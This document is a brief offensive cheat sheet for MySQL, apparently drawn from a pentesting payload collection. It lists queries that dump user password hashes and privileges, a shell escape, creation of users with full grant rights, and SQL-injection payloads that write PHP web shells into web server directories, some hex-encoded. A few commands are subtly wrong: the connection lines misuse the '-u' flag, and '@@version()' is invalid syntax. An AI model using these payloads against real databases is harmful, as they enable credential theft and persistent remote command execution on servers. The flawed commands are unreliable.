# MySQL 

# Connection
```sh
mysql -u <hostname> -u root
mysql -u <hostname> -u root@localhost
```

# Enumeration
```sql
-- Version
SELECT version();
SELECT @@version();

-- User
SELECT user();

-- Get users, permissions and hahes
SELECT * FROM mysql.user;

-- Permission
SHOW GRANTS;
SHOW GRANTS FOR "root"@"localhost";
SHOW GRANTS FOR CURRENT_USER();

-- From DB
SELECT * FROM mysql.user WHERE user="root"; 

-- Get users with file_priv
SELECT user,file_priv FROM mysql.user WHERE file_priv="Y";

-- Get users with Super_priv
SELECT user,Super_priv FROM mysql.user WHERE Super_priv="Y";

-- Database Name
SELECT database();

-- List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = "FUNCTION";

-- @Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = "FUNCTION" AND routine_schema != "sys";

-- Get databases
SHOW databases;

-- Get shell
\! sh
```

# Privilege Escalation
## Create User and Give Privileges
```sql
CREATE USER test identified BY "test";
GRANT SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by "mysql" WITH GRANT OPTION;
```

# Command Execution
```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'

[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

# References
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)